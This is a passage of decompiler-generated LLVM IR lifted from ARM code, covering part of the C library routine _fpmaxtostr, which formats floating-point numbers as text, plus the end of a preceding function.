  %v0_16b98 = phi i32 [ %v0_16b98.pre, %dec_label_pc_16b88..thread2_crit_edge ], [ %v7_16b94, %bb22 ]
  ret i32 %v0_16b98

; uselistorder directives
  uselistorder i32 %v0_16b68, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16b44, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_16b60, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_16a98, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp183 = bitcast float %tmp to i32
  store i32 %tmp183, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-42 = alloca i8, align 1
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-43 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-78 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16ba4 = load i32, i32* @r4, align 4
  store i32 %v3_16ba4, i32* %stack_var_-36, align 4
  %v1_16ba8 = add i32 %arg4, 8
  %v2_16ba8 = inttoptr i32 %v1_16ba8 to i8*
  %v3_16ba8 = load i8, i8* %v2_16ba8, align 1
  %v4_16ba8 = zext i8 %v3_16ba8 to i32
  store i32 %v4_16ba8, i32* %sl.global-to-local, align 4
  store i32 %arg4, i32* %stack_var_-200, align 4
  %v1_16bb4 = or i32 %v4_16ba8, 32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_16bb8 = icmp ult i32 %v1_16bb4, 97
  store i1 %v6_16bb8, i1* %cpsr_n.global-to-local, align 1
  %v7_16bb8 = icmp eq i32 %v1_16bb4, 97
  store i1 %v7_16bb8, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  store i32 %tmp183, i32* %r6.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_16bcc = inttoptr i32 %arg4 to i32*
  %v2_16bcc = load i32, i32* %v1_16bcc, align 4
  store i32 %v2_16bcc, i32* %r1.global-to-local, align 4
  br i1 %v7_16bb8, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_16bd0 = add nuw nsw i32 %v4_16ba8, 6
  store i32 %v2_16bd0, i32* %r3.global-to-local, align 4
  %v2_16bd8 = urem i32 %v2_16bd0, 256
  store i32 %v2_16bd8, i32* %sl.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %v2_16bcc, i32* %ip.global-to-local, align 4
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  %v1_16bf0 = add i32 %arg4, 12
  %v2_16bf0 = inttoptr i32 %v1_16bf0 to i32*
  %v3_16bf0 = load i32, i32* %v2_16bf0, align 4
  store i32 %v3_16bf0, i32* %r2.global-to-local, align 4
  %v1_16bf4 = add i32 %arg4, 4
  %v2_16bf4 = inttoptr i32 %v1_16bf4 to i32*
  %v3_16bf4 = load i32, i32* %v2_16bf4, align 4
  store i32 %v3_16bf4, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16bf8 = icmp slt i32 %v2_16bcc, 0
  store i1 %v1_16bf8, i1* %cpsr_n.global-to-local, align 1
  %v2_16bf8 = icmp eq i32 %v2_16bcc, 0
  store i1 %v2_16bf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_16bf8, label %bb223, label %bb224

bb223:                                            ; preds = %.thread
  store i32 6, i32* %ip.global-to-local, align 4
  br label %bb224

bb224:                                            ; preds = %.thread, %bb223
  %v1_16f58 = phi i32 [ %v2_16bcc, %.thread ], [ 6, %bb223 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_16c04 = and i32 %v3_16bf0, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16c04 = icmp eq i32 %v1_16c04, 0
  store i1 %v2_16c04, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-42, align 1
  br i1 %v2_16c04, label %dec_label_pc_16c1c, label %dec_label_pc_16c28

dec_label_pc_16c1c:                               ; preds = %bb224
  %v1_16c1c = urem i32 %v3_16bf0, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16c1c = icmp eq i32 %v1_16c1c, 0
  store i1 %v2_16c1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16c1c, label %dec_label_pc_16c2c, label %dec_label_pc_16c28

dec_label_pc_16c28:                               ; preds = %dec_label_pc_16c1c, %bb224
  %storemerge = phi i32 [ 43, %bb224 ], [ 32, %dec_label_pc_16c1c ]
  %v0_16c28.off0 = phi i8 [ 43, %bb224 ], [ 32, %dec_label_pc_16c1c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_16c28.off0, i8* %stack_var_-42, align 1
  br label %dec_label_pc_16c2c

dec_label_pc_16c2c:                               ; preds = %dec_label_pc_16c1c, %dec_label_pc_16c28
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %tmp183, i32* %r2.global-to-local, align 4
  %v7_16c48 = fcmp ord double %arg2, 0.000000e+00
  %not.v7_16c48 = xor i1 %v7_16c48, true
  %v9_16c48 = sext i1 %not.v7_16c48 to i32
  store i32 %v9_16c48, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %not.v7_16c48, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16c48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16c48, label %dec_label_pc_16c5c, label %bb226

bb226:                                            ; preds = %dec_label_pc_16c2c
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16d10

dec_label_pc_16c5c:                               ; preds = %dec_label_pc_16c2c
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_16c6c = fcmp ogt double %arg2, 0.000000e+00
  %v7_16c6c = fcmp oeq double %arg2, 0.000000e+00
  %v8_16c6c = select i1 %v6_16c6c, i32 1, i32 -1
  %v9_16c6c = select i1 %v7_16c6c, i32 0, i32 %v8_16c6c
  store i32 %v9_16c6c, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16c70 = icmp slt i32 %v9_16c6c, 0
  store i1 %v1_16c70, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16c6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16c6c, label %dec_label_pc_16c78, label %bb227

dec_label_pc_16c78:                               ; preds = %dec_label_pc_16c5c
  %v10_16c88 = fdiv double 0x3FF000003FD00000, %arg2
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_16c94 = fcmp ogt double %v10_16c88, 0.000000e+00
  %v7_16c94 = zext i1 %v6_16c94 to i32
  store i32 %v7_16c94, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16c98 = icmp eq i1 %v6_16c94, false
  store i1 %v2_16c98, i1* %cpsr_z.global-to-local, align 1
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16e80

bb227:                                            ; preds = %dec_label_pc_16c5c
  %v10_16cf0 = fmul double %arg2, 0x3FD0000000024E38
  %v11_16cf0 = fptrunc double %v10_16cf0 to float
  %v12_16cf0 = bitcast float %v11_16cf0 to i32
  store i32 %v12_16cf0, i32* %r2.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v6_16d04 = fcmp olt double %v10_16cf0, %arg2
  %v7_16d04 = fcmp oeq double %v10_16cf0, %arg2
  %v8_16d04 = select i1 %v6_16d04, i32 1, i32 -1
  %v9_16d04 = select i1 %v7_16d04, i32 0, i32 %v8_16d04
  store i32 %v9_16d04, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16d08 = icmp slt i32 %v9_16d04, 0
  store i1 %v1_16d08, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16d04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16d04, label %dec_label_pc_16d10, label %dec_label_pc_16d54

dec_label_pc_16d10:                               ; preds = %bb226, %bb227
  %v0_16c40.v1_16c548 = phi i32 [ 0, %bb227 ], [ 8, %bb226 ]
  store i32 %arg4, i32* %ip.global-to-local, align 4
  %v2_16d18 = add i32 %arg4, 16
  %v3_16d18 = inttoptr i32 %v2_16d18 to i32*
  store i32 32, i32* %v3_16d18, align 4
  %v0_16d20 = load i32, i32* %sl.global-to-local, align 4
  %v1_16d20 = add i32 %v0_16d20, -96
  %v3_16d20 = sub i32 95, %v0_16d20
  %v4_16d20 = and i32 %v3_16d20, %v0_16d20
  %v5_16d20 = icmp slt i32 %v4_16d20, 0
  store i1 %v5_16d20, i1* %cpsr_v.global-to-local, align 1
  %v6_16d20 = icmp slt i32 %v1_16d20, 0
  store i1 %v6_16d20, i1* %cpsr_n.global-to-local, align 1
  %v7_16d20 = icmp eq i32 %v0_16d20, 96
  store i1 %v7_16d20, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-160, align 4
  %tmp286 = icmp ult i32 %v0_16d20, 97
  br i1 %tmp286, label %bb228, label %.thread127

bb228:                                            ; preds = %dec_label_pc_16d10
  %v5_16d34 = or i32 %v0_16c40.v1_16c548, 4
  store i32 %v5_16d34, i32* %r3.global-to-local, align 4
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_16d10, %bb228
  %v4_16d38 = phi i32 [ %v5_16d34, %bb228 ], [ 3, %dec_label_pc_16d10 ]
  %v4_16d38.v0_16c40.v1_16c54 = select i1 %tmp286, i32 %v4_16d38, i32 %v0_16c40.v1_16c548
  store i32 ptrtoint ([4 x i8]* @global_var_24e38.1273 to i32), i32* %r2.global-to-local, align 4
  %v2_16d44 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_16d44, i32* %r6.global-to-local, align 4
  %v2_16d48 = add i32 %v4_16d38.v0_16c40.v1_16c54, ptrtoint ([4 x i8]* @global_var_24e38.1273 to i32)
  store i32 %v2_16d48, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1728c

dec_label_pc_16d54:                               ; preds = %bb227
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  store i32 %tmp183, i32* %r4.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16e24

dec_label_pc_16e24:                               ; preds = %dec_label_pc_16e24, %dec_label_pc_16d54
  %v0_16e2c = phi i32 [ 256, %dec_label_pc_16d54 ], [ %v3_16e2c, %dec_label_pc_16e24 ]
  %v0_16de8 = phi i32 [ %tmp183, %dec_label_pc_16d54 ], [ %v11_16df0, %dec_label_pc_16e24 ]
  %stack_var_-192.2 = phi i32 [ 8, %dec_label_pc_16d54 ], [ %v2_16e14, %dec_label_pc_16e24 ]
  %stack_var_-180.0 = phi i32 [ 9, %dec_label_pc_16d54 ], [ %v1_16d88, %dec_label_pc_16e24 ]
  %v1_16d88 = add nsw i32 %stack_var_-180.0, -1
  store i32 ptrtoint (i32* @global_var_24e4c.1276 to i32), i32* %r2.global-to-local, align 4
  %v3_16d9c = mul i32 %v1_16d88, 8
  store i32 %v3_16d9c, i32* %r3.global-to-local, align 4
  store i32 %v0_16de8, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v2_16da8 = add i32 %v3_16d9c, ptrtoint (i32* @global_var_24e4c.1276 to i32)
  store i32 %v2_16da8, i32* %ip.global-to-local, align 4
  %v1_16db0 = inttoptr i32 %v2_16da8 to i32*
  %v2_16db0 = load i32, i32* %v1_16db0, align 4
  %v3_16db0 = sext i32 %v2_16db0 to i64
  %v1_16de8 = sext i32 %v0_16de8 to i64
  %v2_16de8 = bitcast i64 %v1_16de8 to double
  %v8_16df0 = bitcast i64 %v3_16db0 to double
  %v9_16df0 = fdiv double %v2_16de8, %v8_16df0
  %v10_16df0 = fptrunc double %v9_16df0 to float
  %v11_16df0 = bitcast float %v10_16df0 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v11_16df0, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  %v6_16e04 = fcmp ogt double %v9_16df0, 0x4CBEBC20
  %v7_16e04 = zext i1 %v6_16e04 to i32
  store i32 %v7_16e04, i32* %r0.global-to-local, align 4
  %v2_16e14 = add i32 %stack_var_-192.2, %v0_16e2c
  store i32 %v2_16e14, i32* %r1.global-to-local, align 4
  store i32 %v11_16df0, i32* %r4.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %v1_16d88, i32* %r2.global-to-local, align 4
  %v2_16e28 = icmp eq i32 %v1_16d88, 0
  %v3_16e2c = sdiv i32 %v0_16e2c, 2
  br i1 %v2_16e28, label %dec_label_pc_16e34, label %dec_label_pc_16e24

dec_label_pc_16e34:                               ; preds = %dec_label_pc_16e24
  %v6_16e44 = fcmp ogt double %v9_16df0, 0x4E6E6B2A
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16e48 = icmp eq i1 %v6_16e44, false
  store i1 %v2_16e48, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 1092616194, i32* %r2.global-to-local, align 4
  %v10_16e68 = fdiv double %v9_16df0, 0x4024000041F00000
  %v11_16e68 = fptrunc double %v10_16e68 to float
  %v12_16e68 = bitcast float %v11_16e68 to i32
  store i32 %v12_16e68, i32* %r0.global-to-local, align 4
  store i32 520, i32* %r3.global-to-local, align 4
  store i32 %v12_16e68, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16e80

dec_label_pc_16e80:                               ; preds = %dec_label_pc_16c78, %dec_label_pc_16e34
  %v0_16e8c73 = phi i32 [ %tmp183, %dec_label_pc_16c78 ], [ %v12_16e68, %dec_label_pc_16e34 ]
  %stack_var_-192.6 = phi i32 [ -1, %dec_label_pc_16c78 ], [ 520, %dec_label_pc_16e34 ]
  %v2_16e80 = ptrtoint i32* %stack_var_-77 to i32
  store i32 %v2_16e80, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16e88

dec_label_pc_16e88:                               ; preds = %dec_label_pc_16f1c.dec_label_pc_16e88_crit_edge, %dec_label_pc_16e80
  %v0_16ec0 = phi i32 [ %v0_16e8c.pre, %dec_label_pc_16f1c.dec_label_pc_16e88_crit_edge ], [ %v0_16e8c73, %dec_label_pc_16e80 ]
  %v0_16ec4 = phi i32 [ %v0_16e88.pre, %dec_label_pc_16f1c.dec_label_pc_16e88_crit_edge ], [ %arg3, %dec_label_pc_16e80 ]
  store i32 %v0_16ec4, i32* %r1.global-to-local, align 4
  %v1_16e90 = sext i32 %v0_16ec0 to i64
  %v2_16e90 = bitcast i64 %v1_16e90 to double
  %v3_16e90 = fptoui double %v2_16e90 to i32
  store i32 %v3_16e90, i32* %r4.global-to-local, align 4
  store i32 %v3_16e90, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16e9c = icmp slt i32 %v3_16e90, 0
  store i1 %v1_16e9c, i1* %cpsr_n.global-to-local, align 1
  %v2_16e9c = icmp eq i32 %v3_16e90, 0
  store i1 %v2_16e9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_16ec4, i32* %r3.global-to-local, align 4
  br i1 %v1_16e9c, label %dec_label_pc_16eac, label %dec_label_pc_16ec0

dec_label_pc_16eac:                               ; preds = %dec_label_pc_16e88
  store i32 bitcast (float fptrunc (double fadd (double undef, double 0x41F0000000024E3B) to float) to i32), i32* %r0.global-to-local, align 4
  store i32 bitcast (float fptrunc (double fadd (double undef, double 0x41F0000000024E3B) to float) to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_16ec4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ec0

dec_label_pc_16ec0:                               ; preds = %dec_label_pc_16e88, %dec_label_pc_16eac
  store i32 %v0_16ec0, i32* @r0, align 4
  store i32 %v0_16ec4, i32* %r1.global-to-local, align 4
  %v1_16ec8 = fptrunc double %v2_16e90 to float
  %v2_16ec8 = bitcast float %v1_16ec8 to i32
  %v4_16ec8 = call i32 @__aeabi_dsub(i32 %v2_16ec8, i32 %v0_16ec4)
  %v5_16ec8 = sext i32 %v4_16ec8 to i64
  store i32 1315859242, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_16ed4 = bitcast i64 %v5_16ec8 to double
  %v9_16ed4 = fmul double %v3_16ed4, 0x41CDCD6540240000
  %v10_16ed4 = fptrunc double %v9_16ed4 to float
  %v11_16ed4 = bitcast float %v10_16ed4 to i32
  store i32 %v11_16ed4, i32* %r0.global-to-local, align 4
  %v0_16ed8 = load i32, i32* %sb.global-to-local, align 4
  %v1_16ed8 = add i32 %v0_16ed8, 9
  store i32 %v1_16ed8, i32* %sb.global-to-local, align 4
  store i32 %v11_16ed4, i32* %r6.global-to-local, align 4
  store i32 %v0_16ec4, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_16ee8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16ee8

dec_label_pc_16ee8:                               ; preds = %dec_label_pc_16ee8.dec_label_pc_16ee8_crit_edge, %dec_label_pc_16ec0
  %v1_16efc = phi i32 [ %v1_16efc.pre, %dec_label_pc_16ee8.dec_label_pc_16ee8_crit_edge ], [ %v1_16ed8, %dec_label_pc_16ec0 ]
  %v0_16ef4 = phi i32 [ %v0_16f10, %dec_label_pc_16ee8.dec_label_pc_16ee8_crit_edge ], [ 0, %dec_label_pc_16ec0 ]
  %v0_16f00 = phi i32 [ %v2_16f0c, %dec_label_pc_16ee8.dec_label_pc_16ee8_crit_edge ], [ %v0_16ee8.pre, %dec_label_pc_16ec0 ]
  %v2_16ef0 = urem i32 %v0_16f00, 10
  %v1_16ef4 = add i32 %v0_16ef4, 1
  store i32 %v1_16ef4, i32* %r5.global-to-local, align 4
  %v1_16ef8 = or i32 %v2_16ef0, 48
  store i32 %v1_16ef8, i32* %r2.global-to-local, align 4
  %v2_16efc = sub i32 %v1_16efc, %v1_16ef4
  store i32 %v2_16efc, i32* %r3.global-to-local, align 4
  store i32 %v0_16f00, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_16f08 = trunc i32 %v1_16ef8 to i8
  %v3_16f08 = inttoptr i32 %v2_16efc to i8*
  store i8 %v1_16f08, i8* %v3_16f08, align 1
  %v0_16f0c = load i32, i32* %r0.global-to-local, align 4
  %v1_16f0c = load i32, i32* %r1.global-to-local, align 4
  %v2_16f0c = udiv i32 %v0_16f0c, %v1_16f0c
  store i32 %v2_16f0c, i32* %r0.global-to-local, align 4
  %v0_16f10 = load i32, i32* %r5.global-to-local, align 4
  %v1_16f10 = add i32 %v0_16f10, -8
  %v3_16f10 = sub i32 7, %v0_16f10
  %v4_16f10 = and i32 %v3_16f10, %v0_16f10
  %v5_16f10 = icmp slt i32 %v4_16f10, 0
  store i1 %v5_16f10, i1* %cpsr_v.global-to-local, align 1
  %v6_16f10 = icmp slt i32 %v1_16f10, 0
  store i1 %v6_16f10, i1* %cpsr_n.global-to-local, align 1
  %v7_16f10 = icmp eq i32 %v0_16f10, 8
  store i1 %v7_16f10, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_16f0c, i32* %r4.global-to-local, align 4
  %v7_16f18 = icmp slt i32 %v0_16f10, 9
  br i1 %v7_16f18, label %dec_label_pc_16ee8.dec_label_pc_16ee8_crit_edge, label %dec_label_pc_16f1c

dec_label_pc_16ee8.dec_label_pc_16ee8_crit_edge:  ; preds = %dec_label_pc_16ee8
  %v1_16efc.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_16ee8

dec_label_pc_16f1c:                               ; preds = %dec_label_pc_16ee8
  %v0_16f1c = load i32, i32* %r8.global-to-local, align 4
  %v1_16f1c = add i32 %v0_16f1c, 1
  store i32 %v1_16f1c, i32* %r8.global-to-local, align 4
  %v3_16f20 = sub i32 -1, %v0_16f1c
  %v4_16f20 = and i32 %v1_16f1c, %v3_16f20
  %v5_16f20 = icmp slt i32 %v4_16f20, 0
  store i1 %v5_16f20, i1* %cpsr_v.global-to-local, align 1
  %v6_16f20 = icmp slt i32 %v0_16f1c, 0
  store i1 %v6_16f20, i1* %cpsr_n.global-to-local, align 1
  %v7_16f20 = icmp eq i32 %v0_16f1c, 0
  store i1 %v7_16f20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16f20, label %dec_label_pc_16f1c.dec_label_pc_16e88_crit_edge, label %dec_label_pc_16f28

dec_label_pc_16f1c.dec_label_pc_16e88_crit_edge:  ; preds = %dec_label_pc_16f1c
  %v0_16e88.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_16e8c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16e88

dec_label_pc_16f28:                               ; preds = %dec_label_pc_16f1c
  %v0_16f28 = load i32, i32* %sl.global-to-local, align 4
  %v1_16f28 = add i32 %v0_16f28, -96
  %v3_16f28 = sub i32 95, %v0_16f28
  %v4_16f28 = and i32 %v3_16f28, %v0_16f28
  %v5_16f28 = icmp slt i32 %v4_16f28, 0
  store i1 %v5_16f28, i1* %cpsr_v.global-to-local, align 1
  %v6_16f28 = icmp slt i32 %v1_16f28, 0
  store i1 %v6_16f28, i1* %cpsr_n.global-to-local, align 1
  %v7_16f28 = icmp eq i32 %v0_16f28, 96
  store i1 %v7_16f28, i1* %cpsr_z.global-to-local, align 1
  %tmp287 = icmp ult i32 %v0_16f28, 97
  store i32 %v1_16f58, i32* %ip.global-to-local, align 4
  br i1 %tmp287, label %bb229, label %thread-pre-split

bb229:                                            ; preds = %dec_label_pc_16f28
  %v5_16f38 = add i32 %v0_16f28, 32
  store i32 %v5_16f38, i32* %r3.global-to-local, align 4
  %v5_16f3c = urem i32 %v5_16f38, 256
  store i32 %v5_16f3c, i32* %sl.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_16f28, %bb229
  %v0_16f60 = phi i32 [ %v5_16f3c, %bb229 ], [ %v0_16f28, %dec_label_pc_16f28 ]
  %stack_var_-58.0131138 = phi i32 [ 69, %bb229 ], [ 101, %dec_label_pc_16f28 ]
  %v7_16f40 = icmp eq i32 %v0_16f60, 103
  %. = zext i1 %v7_16f40 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16f4c = icmp slt i32 %v1_16f58, 0
  store i1 %v1_16f4c, i1* %cpsr_n.global-to-local, align 1
  %v2_16f4c = icmp eq i32 %v1_16f58, 0
  store i1 %v2_16f4c, i1* %cpsr_z.global-to-local, align 1
  %tmp232 = icmp slt i32 %v1_16f58, 1
  br i1 %tmp232, label %.thread12, label %bb233

.thread12:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb235

bb233:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16f54 = icmp eq i1 %v7_16f40, false
  store i1 %v2_16f54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16f54, label %bb235, label %bb234

bb234:                                            ; preds = %bb233
  %v2_16f58 = add i32 %v1_16f58, -1
  store i32 %v2_16f58, i32* %ip.global-to-local, align 4
  br label %bb235

bb235:                                            ; preds = %.thread12, %bb233, %bb234
  %v0_16f5c = phi i32 [ %v1_16f58, %.thread12 ], [ %v1_16f58, %bb233 ], [ %v2_16f58, %bb234 ]
  %v1_16f60 = add i32 %v0_16f60, -102
  %v3_16f60 = sub i32 101, %v0_16f60
  %v4_16f60 = and i32 %v3_16f60, %v0_16f60
  %v5_16f60 = icmp slt i32 %v4_16f60, 0
  store i1 %v5_16f60, i1* %cpsr_v.global-to-local, align 1
  %v6_16f60 = icmp slt i32 %v1_16f60, 0
  store i1 %v6_16f60, i1* %cpsr_n.global-to-local, align 1
  %v7_16f60 = icmp eq i32 %v0_16f60, 102
  store i1 %v7_16f60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16f60, label %dec_label_pc_16f6c, label %bb236

bb236:                                            ; preds = %bb235
  store i32 %v0_16f5c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16f98

dec_label_pc_16f6c:                               ; preds = %bb235
  store i32 %v0_16f5c, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-192.6, i32* %r1.global-to-local, align 4
  %v2_16f74 = add i32 %v0_16f5c, %stack_var_-192.6
  store i32 %v2_16f74, i32* %ip.global-to-local, align 4
  %v1_16f78 = add i32 %v2_16f74, 1
  %v3_16f78 = sub i32 0, %v2_16f74
  %v4_16f78 = and i32 %v1_16f78, %v3_16f78
  %v5_16f78 = icmp slt i32 %v4_16f78, 0
  store i1 %v5_16f78, i1* %cpsr_v.global-to-local, align 1
  %v6_16f78 = icmp slt i32 %v1_16f78, 0
  store i1 %v6_16f78, i1* %cpsr_n.global-to-local, align 1
  %v7_16f78 = icmp eq i32 %v1_16f78, 0
  store i1 %v7_16f78, i1* %cpsr_z.global-to-local, align 1
  %v2_16f7c = xor i1 %v6_16f78, %v5_16f78
  br i1 %v2_16f7c, label %dec_label_pc_16f80, label %dec_label_pc_16f98

dec_label_pc_16f80:                               ; preds = %dec_label_pc_16f6c
  %v2_16f80 = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_16f80, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_16f8c = bitcast i32* %stack_var_-79 to i8*
  %v3_16f8c = call i32 @__GI_memset(i8* %v2_16f8c, i32 48)
  store i32 %v3_16f8c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16f98

dec_label_pc_16f98:                               ; preds = %bb236, %dec_label_pc_16f6c, %dec_label_pc_16f80
  %v1_16fdc88 = phi i32 [ %v3_16f8c, %dec_label_pc_16f80 ], [ %v0_16f5c, %dec_label_pc_16f6c ], [ %v2_16f0c, %bb236 ]
  %v1_16fc0 = phi i32 [ -1, %dec_label_pc_16f80 ], [ %v2_16f74, %dec_label_pc_16f6c ], [ %v0_16f5c, %bb236 ]
  %stack_var_-192.7 = phi i32 [ -1, %dec_label_pc_16f80 ], [ %stack_var_-192.6, %dec_label_pc_16f6c ], [ %stack_var_-192.6, %bb236 ]
  %v1_16f9c = add i32 %v1_16fc0, -16
  %v3_16f9c = sub i32 15, %v1_16fc0
  %v4_16f9c = and i32 %v3_16f9c, %v1_16fc0
  %v5_16f9c = icmp slt i32 %v4_16f9c, 0
